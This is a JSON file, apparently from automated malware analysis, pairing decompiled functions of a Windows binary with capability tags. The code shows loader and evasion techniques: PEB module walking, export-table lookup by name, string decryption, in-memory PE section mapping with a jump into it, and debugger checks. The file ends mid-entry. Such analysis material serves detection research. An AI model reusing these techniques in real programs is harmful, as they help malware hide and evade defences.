{
    "0040104c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.0040104c(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iStack72;\n    int32_t iStack44;\n    uint var_bp_ch;\n    \n    if (arg_14h == 0) {\n        iStack44 = 0;\n        iVar1 = *(arg_18h + 0x3c);\n        if (iVar1 != 0) {\n            do {\n                *(arg_8h + iStack44) = *(arg_ch + iStack44);\n                iStack44 = iStack44 + 1;\n            } while (iStack44 != iVar1);\n        }\n    }\n    iVar1 = *(arg_10h + 0xc);\n    iVar2 = *(arg_10h + 0x10);\n    iVar3 = *(arg_10h + 0x14);\n    iStack72 = 0;\n    if (iVar2 != 0) {\n        do {\n            *(arg_8h + iVar1 + iStack72) = *(arg_ch + iVar3 + iStack72);\n            iStack72 = iStack72 + 1;\n        } while (iStack72 != iVar2);\n    }\n    return;\n}\n",
        "token_count": 325
    },
    "004011c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004011c8(uint arg_8h, uint arg_ch)\n\n{\n    uint arg_8h_00;\n    code *pcVar1;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_10h;\n    \n    var_10h = 0x2129c92a;\n    fcn.00401c60(&var_30h, 0x404211, 0xe);\n    arg_8h_00 = fcn.00401ae0();\n    pcVar1 = fcn.00403241(arg_8h_00, &var_30h);\n    var_44h = 0;\n    if (0xff < pcVar1) {\n        var_44h = (*pcVar1)(0, arg_ch, 0x2129d92a - var_10h, arg_8h);\n    }\n    return var_44h;\n}\n",
        "token_count": 234
    },
    "004014f8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004014f8(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_10h;\n    uint var_8h;\n    \n    if (arg_ch == 0) {\n        *0x405274 = arg_8h;\n        return arg_8h != 0;\n    }\n    *0x405284 = arg_8h;\n    return arg_8h != 0;\n}\n",
        "token_count": 98
    },
    "0040157b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040157b(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x405274 = 0;\n    *0x405284 = 0;\n    if (arg_8h != 0) {\n        if (arg_8h == 1) {\n            *0x405274 = 1;\n        }\n        else {\n            *0x405274 = arg_8h;\n        }\n    }\n    if (arg_ch != 0) {\n        *0x405284 = arg_ch + 4;\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: arg_ch\n\nbool __cdecl entry0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint in_stack_00000010;\n    uint in_stack_00000014;\n    uint in_stack_00000018;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uchar auStack76 [40];\n    uint var_20h;\n    uchar auStack24 [4];\n    uint var_4h;\n    \n    fcn.0040157b(unaff_ESI, &stack0xfffffffc);\n    if (unaff_EBX == 0x10) {\n        *(unaff_EBP + -4) = 0;\n    }\n    (*_sym.imp.KERNEL32.dll_GetCommandLineA)();\n    fcn.004017c9();\n    *0x40527c = in_stack_00000010;\n    *0x405280 = in_stack_00000018;\n    *0x405278 = in_stack_00000014;\n    fcn.004015e7();\n    fcn.004017c9();\n    iVar1 = fcn.00402c83(_sym.imp.KERNEL32.dll_AllocConsole);\n    if (iVar1 == 0) {\n        fcn.00402994();\n        (*_sym.imp.USER32.dll_TranslateMessage)(auStack24);\n        (*_sym.imp.ole32.dll_CoRevokeMallocSpy)();\n        (*_sym.imp.USER32.dll_GetComboBoxInfo)(0x6e0cae, auStack76);\n    }\n    fcn.00401366();\n    fcn.004013db();\n    return iVar1 == 0;\n}\n",
        "token_count": 520
    },
    "00401a5b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00401a5b(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x30);\n}\n",
        "token_count": 88
    },
    "00401ae0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_eh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401ae0(void)\n\n{\n    int32_t iVar1;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint *var_8ch;\n    int32_t var_88h;\n    uint *var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_6dh;\n    uint var_5ch;\n    int32_t var_14h;\n    uint var_eh;\n    \n    var_84h = &var_6dh;\n    var_eh._0_2_ = 0xb6c7;\n    var_14h = 0x1a3a99f;\n    fcn.00401c60(var_84h, 0x4041eb, 0xe);\n    var_88h = 0;\n    var_8ch = &var_5ch;\n    do {\n        if (*var_84h == '\\0') {\n            *var_8ch = var_eh ^ 0xb6c7;\n            break;\n        }\n        iVar1 = 0x1a3a9a0 - var_14h;\n        *var_8ch = *var_84h;\n        var_88h = var_88h + iVar1;\n        var_84h = var_84h + 1;\n        var_8ch = var_8ch + 2;\n    } while (var_88h != var_14h + -0x1a3a98e);\n    fcn.0040243b(&var_5ch, 0);\n    return;\n}\n",
        "token_count": 403
    },
    "00401cfa": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401cfa(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    var_18h = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + var_18h) = *(arg_ch + var_18h);\n            var_18h = var_18h + 1;\n        } while (var_18h != arg_10h);\n    }\n    return arg_8h;\n}\n",
        "token_count": 149
    },
    "00401d48": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401d48(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    iVar1 = var_8h;\n    do {\n        var_8h = iVar1;\n        iVar1 = var_8h + 1;\n    } while (*(arg_8h + var_8h) != '\\0');\n    return var_8h;\n}\n",
        "token_count": 119
    },
    "00401d7a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00401d7a(void)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_FS_OFFSET;\n    bool bVar3;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_2h;\n    \n    var_2h._0_2_ = 0xad3c;\n    var_8h = 0x50d40b6;\n    var_ch = 0;\n    iVar1 = fcn.00402782();\n    bVar3 = false;\n    if (iVar1 != 0) {\n        iVar1 = fcn.0040243b(0, iVar1);\n        pcVar2 = fcn.004031c9();\n        bVar3 = false;\n        if (pcVar2 != NULL) {\n            bVar3 = false;\n            if (**(iVar1 + 0x28) != 0) {\n                (*pcVar2)(*(iVar1 + 0x28), &var_ch, iVar1, 0);\n                iVar1 = *(in_FS_OFFSET + 0x18);\n                if (iVar1 == 0) {\n                    iVar1 = -1;\n                }\n                bVar3 = *(iVar1 + 0x34) != (var_8h ^ 0x50d4077);\n            }\n        }\n    }\n    return bVar3;\n}\n",
        "token_count": 415
    },
    "00401e40": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid __cdecl fcn.00401e40(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uStack48;\n    uint32_t uStack32;\n    uint var_bp_ch;\n    \n    uStack48 = 4;\n    uStack32 = 0;\n    do {\n        for (uVar1 = *(uStack32 + 0x404252); uVar1 < arg_10h; uVar1 = uVar1 + 0x33) {\n            uVar2 = uVar1 & 3;\n            if (2 < uStack48) {\n                uVar2 = uVar1 % 0x32;\n            }\n            uStack48 = uVar1 + uStack48;\n            *(arg_8h + uVar1) = *(arg_ch + uVar1) - *(uVar2 + 0x40421f);\n        }\n        uStack32 = uStack32 + 1;\n    } while (uStack48 != 0 && uStack32 < 0x33);\n    return;\n}\n",
        "token_count": 270
    },
    "00401fa0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00401fa0(int32_t arg_8h)\n\n{\n    uint var_24h;\n    int16_t *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    code *var_14h;\n    uint var_10h;\n    uint var_8h;\n    \n    var_14h = fcn.00403352;\n    if (arg_8h == 0) {\n        for (; ((*var_14h != 0x5a4d || (*(var_14h + *(var_14h + 0x3c)) != 'P')) ||\n               (var_20h = var_14h,  *(var_14h + *(var_14h + 0x3c) + 1) != 'E'));\n            var_14h = var_14h + -0x1000 & 0xfffff000) {\n        }\n    }\n    else {\n        var_20h = fcn.0040243b(arg_8h, 0);\n    }\n    return var_20h;\n}\n",
        "token_count": 243
    },
    "004021ce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dh\n\nint32_t __cdecl fcn.004021ce(int32_t arg_8h)\n\n{\n    char cVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_4ch;\n    uint32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uint16_t *var_34h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    \n    iVar4 = fcn.00402782();\n    iVar5 = 0;\n    if (*(iVar4 + 1 + *(iVar4 + 0x3c)) == 'E') {\n        iVar5 = iVar4 + *(iVar4 + 0x3c);\n    }\n    iVar5 = *(iVar5 + 0x78);\n    uVar3 = *(iVar4 + 0x18 + iVar5);\n    if (uVar3 != 0) {\n        var_34h = iVar4 + *(iVar4 + iVar5 + 0x24);\n        var_38h = 0;\n        do {\n            var_48h = 0;\n            do {\n                cVar1 = *(iVar4 + *(iVar4 + *(iVar4 + 0x20 + iVar5) + var_38h * 4) + var_48h);\n                cVar2 = *(arg_8h + var_48h);\n                if (cVar1 == '\\0') break;\n                var_48h = var_48h + 1;\n            } while ((cVar1 == cVar2 && cVar2 != '\\0') && var_48h < 0x20);\n            if (cVar1 == cVar2) {\n                return iVar4 + *(iVar4 + *(iVar4 + iVar5 + 0x1c) + *var_34h * 4);\n            }\n            var_34h = var_34h + 1;\n            var_38h = var_38h + 1;\n        } while (var_38h < uVar3);\n    }\n    return 0;\n}\n",
        "token_count": 536
    },
    "00402313": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004023bc)\n\nint32_t __cdecl fcn.00402313(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    arg_8h_00 = fcn.004011c8(0x40, 0x19000);\n    var_10h = 0;\n    if (arg_8h_00 != 0) {\n        fcn.00402b78(arg_8h_00, arg_ch);\n        *(arg_8h + 0x54) = arg_8h_00;\n        *(arg_8h + 0x58) = arg_8h_00 + -0x400000;\n        var_10h = arg_8h_00 + 0x2b30;\n    }\n    return var_10h;\n}\n",
        "token_count": 251
    },
    "0040243b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Removing unreachable block (ram,0x00402669)\n\nint32_t * __cdecl fcn.0040243b(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t in_FS_OFFSET;\n    bool bVar5;\n    int32_t *piStack60;\n    uint32_t uStack40;\n    uint var_bp_ch;\n    \n    iVar3 = *(in_FS_OFFSET + 0x18);\n    if (iVar3 == 0) {\n        iVar3 = -1;\n    }\n    iVar3 = *(*(iVar3 + 0x30) + 0xc);\n    piVar4 = iVar3 + 0x14;\n    piStack60 = *(iVar3 + 0x14);\n    if (piStack60 != piVar4) {\n        do {\n            if (piStack60[4] == arg_ch && arg_ch != NULL) {\n                return piStack60 + -2;\n            }\n            if (arg_8h != 0) {\n                uStack40 = 0;\n                if (*(piStack60 + 9) >> 1 != 0) {\n                    do {\n                        iVar2 = *(piStack60[10] + uStack40 * 2);\n                        if (iVar2 - 0x61U < 0x1a) {\n                            iVar2 = iVar2 + -0x20;\n                        }\n                        iVar1 = *(arg_8h + uStack40 * 2);\n                        if (iVar1 - 0x61U < 0x1a) {\n                            iVar1 = iVar1 + -0x20;\n                        }\n                        if (iVar2 == 0) {\n                            bVar5 = iVar1 == 0;\n                            break;\n                        }\n                        bVar5 = iVar2 == iVar1;\n                        uStack40 = uStack40 + 1;\n                    } while (bVar5 && uStack40 < *(piStack60 + 9) >> 1);\n                    if (bVar5) {\n                        return piStack60[4];\n                    }\n                }\n            }\n            piStack60 = *piStack60;\n        } while (piStack60 != piVar4);\n    }\n    return NULL;\n}\n",
        "token_count": 519
    },
    "00402782": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.00402782(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint *var_80h;\n    uint var_7ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint *var_60h;\n    char var_5bh;\n    uint var_5ah;\n    int32_t var_14h;\n    uint *var_10h;\n    uint32_t var_ch;\n    \n    var_80h = &var_7ch;\n    var_ch = 0x7f04e4bb;\n    var_14h = 0x4270c2d2;\n    fcn.00401c60(var_80h, 0x4041e0, 0xb);\n    var_64h = 0;\n    var_10h = &var_5ah;\n    do {\n        var_60h = var_80h;\n        var_68h = var_64h;\n        var_5bh = *var_80h;\n        if (var_5bh == '\\0') {\n            *var_10h = 0;\n            break;\n        }\n        *var_10h = var_5bh;\n        var_64h = var_64h + 1;\n        var_10h = var_10h + 2;\n        var_80h = var_80h + 1;\n    } while (var_64h != 0x14);\n    do {\n        uVar2 = var_ch ^ 0x14476351;\n        uVar3 = var_14h * 0x64ee2337;\n        uVar1 = fcn.0040243b(&var_5ah, 0);\n    } while (uVar2 == uVar3);\n    return uVar1;\n}\n",
        "token_count": 472
    },
    "004028e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.004028e2(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    if (iVar1 == 0) {\n        iVar1 = -1;\n    }\n    return *(iVar1 + 0x34);\n}\n",
        "token_count": 73
    },
    "00402994": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_c8h\n// WARNING: Variable defined which should be unmapped: var_c4h\n// WARNING: Variable defined which should be unmapped: var_c0h\n// WARNING: Variable defined which should be unmapped: var_bch\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00402994(void)\n\n{\n    uint uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_a8h;\n    int32_t var_a0h;\n    code *var_9ch;\n    int16_t *var_98h;\n    code *var_94h;\n    uint8_t *var_90h;\n    uint var_8ch;\n    uint var_58h;\n    uint var_54h;\n    int16_t *var_40h;\n    uint var_3ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_9h;\n    \n    var_9h._0_1_ = 0xfe;\n    var_10h = 0x3d49957e;\n    var_14h = 0x53095f1a;\n    uVar1 = fcn.00402048(&var_b0h);\n    var_58h = var_b0h;\n    var_54h = 0x12a00;\n    var_20h = *0x405274;\n    var_a0h = 0x47a95ad6;\n    var_1ch = *0x405278;\n    var_18h = *0x40527c;\n    var_24h = *0x405280;\n    var_28h = *0x405284;\n    for (var_9ch = fcn.00403352;\n        ((var_98h = var_9ch,  *var_9ch != 0x5a4d || (puVar2 = *(var_9ch + 0x3c) + var_9ch,  *puVar2 != (var_9h ^ 0xae)))\n        || (var_90h = puVar2 + 1,  *var_90h != 0x45)); var_9ch = var_9ch + -0x1000 & 0xfffff000) {\n    }\n    var_40h = var_9ch;\n    iVar4 = var_10h + -0x3d49957e;\n    puVar3 = NULL;\n    if (*var_90h == 0x45) {\n        puVar3 = puVar2;\n    }\n    var_3ch = *(puVar3 + 0x50);\n    var_94h = fcn.00402313(&var_8ch, var_a8h);\n    var_a0h = iVar4;\n    if (var_94h != NULL) {\n        (*var_94h)(&var_8ch, var_a8h, iVar4, uVar1, &var_b0h, &var_8ch);\n        var_a0h = 1;\n    }\n    return var_a0h;\n}\n",
        "token_count": 801
    },
    "00402b78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_dh\n\nvoid __cdecl fcn.00402b78(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_dh;\n    \n    if (((arg_8h != 0 && arg_ch != 0) && (iVar1 = arg_ch + *(arg_ch + 0x3c),  *(arg_ch + *(arg_ch + 0x3c)) == 'P')) &&\n       (iVar1 != 0 && *(iVar1 + 1) == 'E')) {\n        if (*(iVar1 + 6) != 0) {\n            var_24h = iVar1 + 0x18 + *(iVar1 + 0x14);\n            var_28h = 0;\n            do {\n                fcn.0040104c(arg_8h, arg_ch, var_24h, var_28h, iVar1 + 0x18);\n                var_24h = var_24h + 0x28;\n                var_28h = var_28h + 1;\n            } while (var_28h < *(iVar1 + 6));\n        }\n    }\n    return;\n}\n",
        "token_count": 348
    },
    "00402c83": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00402c83(uint arg_8h)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004026c6(arg_8h);\n    bVar2 = true;\n    if (iVar1 == 0) {\n        iVar1 = fcn.004028fc();\n        bVar2 = true;\n        if (iVar1 == 0) {\n            iVar1 = fcn.00401d7a();\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 147
    },
    "00403241": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403241(uint arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    var_ch = 0x2f456bb2;\n    var_4ch = 0;\n    if (arg_ch != 0) {\n        fcn.00401c60(&var_38h, 0x4041f9, 0x18);\n        pcVar2 = fcn.004021ce(&var_38h);\n        var_4ch = 0;\n        if (pcVar2 != NULL) {\n            var_10h = arg_ch;\n            var_50h = 0;\n            uVar1 = var_50h;\n            do {\n                var_50h = uVar1;\n                uVar1 = var_50h + var_ch + -0x2f456bb1;\n            } while (*(arg_ch + var_50h) != '\\0');\n            var_14h._0_2_ = var_50h;\n            var_58h = 0;\n            if ((var_50h & 0xffff) != 0x2f456bb2U - var_ch) {\n                var_3ch = 0;\n                var_14h._2_2_ = var_14h;\n                (*pcVar2)(arg_8h, &var_14h, 0, &var_3ch, &var_14h, 0x18);\n                var_58h = var_3ch;\n            }\n            var_4ch = var_58h;\n        }\n    }\n    return var_4ch;\n}\n",
        "token_count": 521
    },
    "00401c60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401c60(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_20h = 0;\n    if (arg_10h != 0) {\n        do {\n            uVar1 = var_20h & 7;\n            if (var_20h < 8) {\n                uVar1 = var_20h;\n            }\n            if (arg_10h < uVar1 || 8 < uVar1) {\n                return;\n            }\n            *(arg_8h + var_20h) = *(arg_ch + var_20h) - *(uVar1 + 0x404285);\n            var_20h = var_20h + 1;\n        } while (var_20h < arg_10h);\n    }\n    return;\n}\n",
        "token_count": 248
    },
    "004026c6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5h\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.004026c6(char *arg_8h)\n\n{\n    char cVar1;\n    uint var_15h;\n    uint var_10h;\n    uint var_ch;\n    uint var_5h;\n    \n    cVar1 = *arg_8h;\n    while( true ) {\n        if (cVar1 != -1) {\n            var_15h._0_1_ = false;\n            if ((cVar1 == -0x48) && (var_15h._0_1_ = false,  arg_8h[3] == 'P')) {\n                var_15h._0_1_ = arg_8h[4] == -0x33;\n            }\n            return var_15h._0_1_;\n        }\n        if (arg_8h[1] != '%') break;\n        arg_8h = **(arg_8h + 2);\n        cVar1 = *arg_8h;\n    }\n    return false;\n}\n",
        "token_count": 246
    },
    "004028fc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
